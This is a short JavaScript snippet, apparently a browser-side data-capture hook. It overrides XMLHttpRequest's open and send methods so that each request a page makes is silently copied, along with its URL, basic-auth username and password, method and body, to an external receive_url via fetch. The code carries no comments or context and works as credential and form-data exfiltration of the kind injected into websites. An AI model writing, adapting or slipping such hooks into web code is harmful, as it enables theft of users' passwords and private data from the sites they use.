function captureXHR(receive_url){
  XMLHttpRequest.prototype._send = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype._open = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(method, url, async, user, password){
    var a = document.createElement('a');
    a.href = url;
    url = escape(a.href);
    this.sucks = {method,url,async,user,password};
    this._open.apply(this,arguments);
  };
  XMLHttpRequest.prototype.send = function(data){
    this.sucks.body = data;
    this._send.call(this,data);
    receive_url&&
      fetch(
        `${receive_url}?url=${this.sucks.url}&user=${this.sucks.user}&password=${this.sucks.password}`
        ,{method:this.sucks.method,body:this.sucks.body,mode:'cors'}
      );
  };
}
